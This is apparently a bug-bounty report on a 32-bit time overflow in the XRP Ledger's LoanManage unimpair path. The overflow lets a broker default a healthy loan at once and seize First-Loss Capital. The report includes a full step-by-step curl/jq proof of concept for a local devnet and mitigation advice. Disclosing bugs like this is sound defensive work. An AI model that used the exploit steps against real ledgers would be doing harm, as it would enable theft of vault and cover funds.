# Title
Arithmetic overflow in LoanManage::unimpairLoan next-due calculation enables immediate defaults

**Severity:** Critical

# Description

## Brief/Intro
`LoanManage::unimpairLoan` computes the next due date as either the normal schedule date or `now + PaymentInterval`. This addition uses a 32‑bit seconds field with no overflow guard. If `PaymentInterval` was valid at loan creation but later `parentCloseTime + PaymentInterval` exceeds the 32‑bit max, the value wraps, setting `sfNextPaymentDueDate` into the past and allowing immediate default.

## Vulnerability Details
- Affected code: `LoanManage::unimpairLoan` sets the next due date without overflow checks on either addition site (both can overflow):
  ```cpp
  // LoanManage.cpp
  loanSle->clearFlag(lsfLoanImpaired);
  auto const paymentInterval = loanSle->at(sfPaymentInterval);
  auto const normalPaymentDueDate =
      std::max(loanSle->at(sfPreviousPaymentDate), loanSle->at(sfStartDate)) +
      paymentInterval;
  if (!hasExpired(view, normalPaymentDueDate))
  {
      loanSle->at(sfNextPaymentDueDate) = normalPaymentDueDate;
  }
  else
  {
      loanSle->at(sfNextPaymentDueDate) =
          view.parentCloseTime().time_since_epoch().count() + paymentInterval;
  }
  ```
  - File: `src/xrpld/app/tx/detail/LoanManage.cpp` (unimpair path)
  Both `normalPaymentDueDate = max(prev,start) + interval` and `parentCloseTime + interval` use a 32‑bit seconds field; neither is guarded here.
- By contrast, `LoanSet::preclaim` guards schedule arithmetic against overflow at creation time by bounding `PaymentInterval` and `PaymentTotal` relative to the then‑current ledger close time. No analogous guard exists for the unimpair path, so a previously valid `PaymentInterval` can later overflow when added to a later `parentCloseTime`.
- Consequence: wrapped `sfNextPaymentDueDate` is effectively “in the past”. The default check
  ```cpp
  hasExpired(view, loanSle->at(sfNextPaymentDueDate) + loanSle->at(sfGracePeriod))
  ```
  becomes immediately true (see `src/libxrpl/ledger/View.cpp:160–176`), enabling a premature `tfLoanDefault` and application of First‑Loss Capital.

## Impact Details
- Selected impact: **Drainage and/or stealing of funds from ledger objects (vault, first loss capital)**.
- Effects:
  - Time arithmetic overflow sets `sfNextPaymentDueDate` to the past, letting a broker default a healthy loan immediately.
  - Default processing then seizes `defaultCovered` from the broker pseudo-account, immediately reducing `sfCoverAvailable` and delivering funds to the vault despite on‑time repayments.
  - This mirrors the previously reported default overflow bug but through the unimpair path, enabling direct First Loss Capital extraction.

## References
- Unimpair logic: `src/xrpld/app/tx/detail/LoanManage.cpp` (unimpairLoan)
- Creation‑time guards: `src/xrpld/app/tx/detail/LoanSet.cpp` (preclaim time overflow checks)
- Expiry check: `src/libxrpl/ledger/View.cpp:160–176` (`hasExpired` implementation)

# Proof of Concept

> Run against a local devnet/single‑node. This PoC mirrors the structure of previous freeze‑enforcement PoCs and uses `jq` for parsing.

1. Start node
   ```bash
   ./rippled -a --start --conf rippled.cfg
   ```

2. Derive wallets (issuer I, broker owner B, borrower R)
   ```bash
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"issuer unimpair-overflow poc"}]}' | tee issuer_wallet.json
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"broker unimpair-overflow poc"}]}' | tee broker_wallet.json
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"borrower unimpair-overflow poc"}]}' | tee borrower_wallet.json

   ISSUER_ACCOUNT=$(jq -r '.result.account_id' issuer_wallet.json)
   ISSUER_SECRET=$(jq -r '.result.master_seed' issuer_wallet.json)
   BROKER_ACCOUNT=$(jq -r '.result.account_id' broker_wallet.json)
   BROKER_SECRET=$(jq -r '.result.master_seed' broker_wallet.json)
   BORROWER_ACCOUNT=$(jq -r '.result.account_id' borrower_wallet.json)
   BORROWER_SECRET=$(jq -r '.result.master_seed' borrower_wallet.json)
   ```

3. Fund accounts
   ```bash
   for acct in "$ISSUER_ACCOUNT" "$BROKER_ACCOUNT" "$BORROWER_ACCOUNT"; do
     curl -s -X POST http://127.0.0.1:5005 -d "{\
       \"method\":\"submit\",\
       \"params\":[{\
         \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",\
         \"tx_json\":{\
           \"TransactionType\":\"Payment\",\
           \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",\
           \"Destination\":\"$acct\",\
           \"Amount\":\"100000000000\"\
         }\
       }]\
     }" | jq '.result.engine_result'
   done
   ```

4. Establish IOU trustlines and fund owner
   ```bash
   # Broker trust line to issuer IOU
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BROKER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"TrustSet\",\
         \"Account\":\"$BROKER_ACCOUNT\",\
         \"LimitAmount\":{\
           \"currency\":\"USD\",\
           \"issuer\":\"$ISSUER_ACCOUNT\",\
           \"value\":\"1000000000000\"\
         },\
         \"Flags\":262144\
       }\
     }]\
   }" | jq '.result.engine_result'

   # Borrower trust line (LoanSet later)
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BORROWER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"TrustSet\",\
         \"Account\":\"$BORROWER_ACCOUNT\",\
         \"LimitAmount\":{\
           \"currency\":\"USD\",\
           \"issuer\":\"$ISSUER_ACCOUNT\",\
           \"value\":\"1000000000000\"\
         }\
       }\
     }]\
   }" | jq '.result.engine_result'

   # Issuer supplies IOUs to broker owner
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$ISSUER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"Payment\",\
         \"Account\":\"$ISSUER_ACCOUNT\",\
         \"Destination\":\"$BROKER_ACCOUNT\",\
         \"Amount\":{\
           \"currency\":\"USD\",\
           \"issuer\":\"$ISSUER_ACCOUNT\",\
           \"value\":\"5000000\"\
         },\
         \"Flags\":131072\
       }\
     }]\
   }" | jq '.result.engine_result'
   ```

5. Create vault and get `VaultID`
   ```bash
   VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BROKER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"VaultCreate\",\
         \"Account\":\"$BROKER_ACCOUNT\",\
         \"Asset\":{\
           \"currency\":\"USD\",\
           \"issuer\":\"$ISSUER_ACCOUNT\"\
         },\
         \"Scale\":6\
       }\
     }]\
   }" | jq -r '.result.tx_json.hash')

   VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"tx\",\
     \"params\":[{\"transaction\":\"$VAULT_HASH\"}]\
   }" | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"Vault\").CreatedNode.LedgerIndex')
   ```

6. Create LoanBroker and (optionally) deposit cover
   ```bash
   BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BROKER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"LoanBrokerSet\",\
         \"Account\":\"$BROKER_ACCOUNT\",\
         \"VaultID\":\"$VAULT_ID\",\
         \"CoverRateMinimum\":1\
       }\
     }]\
   }" | jq -r '.result.tx_json.hash')

   LOANBROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"tx\",\
     \"params\":[{\"transaction\":\"$BROKER_HASH\"}]\
   }" | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"LoanBroker\").CreatedNode.LedgerIndex')
   ```

7. Compute a near‑overflow PaymentInterval and prepare a LoanSet (Batch recommended)
   ```bash
   # Approximated: current Ripple‑epoch seconds = (Unix now - 946684800)
   RIPPLE_EPOCH_OFFSET=946684800
   NOW=$(date -u +%s)
   CLOSE=$(( NOW - RIPPLE_EPOCH_OFFSET ))
   MAX32=4294967295
   # Leave minimal headroom to pass LoanSet::preclaim at creation, then overflow on unimpair.
   # NOTE: Adjust the subtractor (0–2) depending on your node's close time.
   PAYMENT_INTERVAL=$(( MAX32 - CLOSE - 1 ))
   echo "Using PaymentInterval=$PAYMENT_INTERVAL"

   # Prepare a Batch with a LoanSet inner transaction:
   #   - LoanBrokerID = $LOANBROKER_ID
   #   - PrincipalRequested ~ 1000 (USD IOU)
   #   - PaymentInterval = $PAYMENT_INTERVAL
   #   - GracePeriod = 0
   #   - Counterparty + CounterpartySignature as required by LoanSet
   # Sign inner txs offline (rippled sign --offline / sign_for), then submit the Batch:
   #   RawTransactions: [ {RawTransaction: $INNER_LOAN_BLOB}, {RawTransaction: $FILLER_BLOB} ]
   ```

   After the Batch succeeds, extract LOAN_ID:
   ```bash
   BATCH_HASH=<BATCH_TX_HASH>
   LOAN_ID=$(curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"tx\",\
     \"params\":[{\"transaction\":\"$BATCH_HASH\"}]\
   }" | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType==\"Loan\").CreatedNode.LedgerIndex')
   ```

8. Impair the loan, wait briefly, then unimpair
   ```bash
   # Impair
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BROKER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"LoanManage\",\
         \"Account\":\"$BROKER_ACCOUNT\",\
         \"LoanID\":\"$LOAN_ID\",\
         \"Flags\":131072   # tfLoanImpair\
       }\
     }]\
   }" | jq '.result.engine_result'

   # Wait so parentCloseTime advances
   sleep 3

   # Unimpair
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BROKER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"LoanManage\",\
         \"Account\":\"$BROKER_ACCOUNT\",\
         \"LoanID\":\"$LOAN_ID\",\
         \"Flags\":262144   # tfLoanUnimpair\
       }\
     }]\
   }" | jq '.result.engine_result'
   ```

9. Verify wrapped NextPaymentDueDate and immediate default
   ```bash
   # Read the loan; observe NextPaymentDueDate is in the past (wraparound)
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"ledger_entry\",\
     \"params\":[{\"index\":\"$LOAN_ID\"}]\
   }" | jq '.result.node.NextPaymentDueDate'

   # Attempt default; should be admissible immediately due to wrapped date
   curl -s -X POST http://127.0.0.1:5005 -d "{\
     \"method\":\"submit\",\
     \"params\":[{\
       \"secret\":\"$BROKER_SECRET\",\
       \"tx_json\":{\
         \"TransactionType\":\"LoanManage\",\
         \"Account\":\"$BROKER_ACCOUNT\",\
         \"LoanID\":\"$LOAN_ID\",\
         \"Flags\":65536   # tfLoanDefault\
       }\
     }]\
   }" | jq '.result.engine_result'
   ```

**Expected:** Unimpair should set the next due date monotonically without overflow.

**Actual:** With a near‑limit PaymentInterval, `parentCloseTime + PaymentInterval` wraps to a past timestamp, making the loan immediately defaultable.

Repro tips:
- If your node's close time makes `MAX32 - CLOSE` very small, reduce the headroom (e.g., subtract 0–2 instead of 1) or re‑run quickly so `CLOSE` hasn't advanced significantly.
- In a unit test or harness with a mocked clock, set `parentCloseTime` precisely to demonstrate overflow deterministically.

## Recommended Mitigation
- Mirror creation‑time overflow guards during unimpair for both additions:
  - Validate that `max(prev,start) + interval` and `parentCloseTime + interval` do not exceed the 32‑bit max; if either would, reject safely (e.g., `tecKILLED`) or clamp using a monotonic policy.
- Prefer centralizing timestamp arithmetic helpers used by `LoanSet` and `LoanManage` to avoid drift.
- Consider a saturating add helper (clamp‑to‑max) shared across both branches to keep behavior consistent and future‑proof.
